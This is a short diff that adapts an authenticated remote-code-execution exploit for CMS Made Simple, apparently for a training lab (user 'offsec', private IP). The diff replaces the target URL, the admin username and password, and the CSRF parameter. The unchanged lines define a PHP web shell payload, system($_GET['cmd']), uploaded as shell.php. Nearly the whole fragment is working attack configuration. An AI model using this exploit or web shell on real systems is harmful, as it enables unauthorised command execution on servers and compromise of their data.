@@ -9,13 +9,13 @@
 import requests
 import base64
 
-base_url = "https://192.168.130.45/admin"
+base_url = "http://192.168.180.52/cmsms/admin"
 upload_dir = "/uploads"
 upload_url = base_url.split('/admin')[0] + upload_dir
-username = "admin"
-password = "HUYfaw763"
+username = "offsec"
+password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ"
 
-csrf_param = "__c"
+csrf_param = "_sk_"
 txt_filename = 'cmsmsrce.txt'
 php_filename = 'shell.php'
 payload = "<?php system($_GET['cmd']);?>"
